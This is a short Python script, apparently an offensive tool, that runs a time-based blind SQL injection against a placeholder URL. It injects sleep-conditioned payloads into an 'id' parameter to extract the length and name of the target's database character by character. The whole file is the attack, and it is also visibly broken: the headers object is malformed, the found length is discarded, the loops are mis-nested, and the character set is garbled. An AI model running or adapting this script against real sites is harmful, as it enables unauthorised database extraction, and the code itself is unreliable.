import requests
import time

headers={'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
chars='abcderfghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
database=''

global length

for i in range(1,20):
    url0='http://../?id=1" and if(length(database())>{0},1,sleep(3))--+'
    urlformat0=url0.format(i)
    start_time0=time.time()
    requests.get(urlformat0,headers=headers)
    if time.time()-start_time0>2:
        print('database length is:'+str(i))
        global length
        length=1
        break
    else:
        pass

    for j in range(1,length+1):
        for char in chars:
            charAscii=ord(char)
            url='http://../?id=1" and if(ascii(substr(database(),{0},1))>{1},1,sleep(3))--+'
            urlformat=url.format(j,charAscii)
            start_time=time.time()
            requests.get(urlformat,headers=headers)
            if time.time()-start_time>2:
                database+=char
                print('database:',database)
                break
            else:
                pass
            print('database is'+database)
